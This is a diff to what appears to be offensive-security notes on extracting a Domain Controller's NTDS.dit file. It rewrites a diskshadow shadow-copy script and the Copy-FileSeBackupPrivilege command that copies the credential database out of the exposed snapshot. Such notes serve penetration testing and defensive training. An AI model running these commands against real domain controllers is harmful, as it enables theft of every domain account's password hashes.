@@ -121,21 +121,38 @@ Direct access to the Domain Controller's file system allows for the theft of the
 
 ```cmd
 diskshadow.exe
-set verbose on
+```
+OR
+```
+diskshadow.exe /s script.txt
+```
+
+Where script is:
+
+```
+SET VERBOSE ON
+
 set metadata C:\Windows\Temp\meta.cab
-set context clientaccessible
+
+set context persistent
+
 begin backup
+
 add volume C: alias cdrive
+
 create
+
 expose %cdrive% F:
+
 end backup
+
 exit
 ```
 
 2. Copy `NTDS.dit` from the shadow copy:
 
 ```cmd
-Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
 Alternatively, use `robocopy` for file copying:
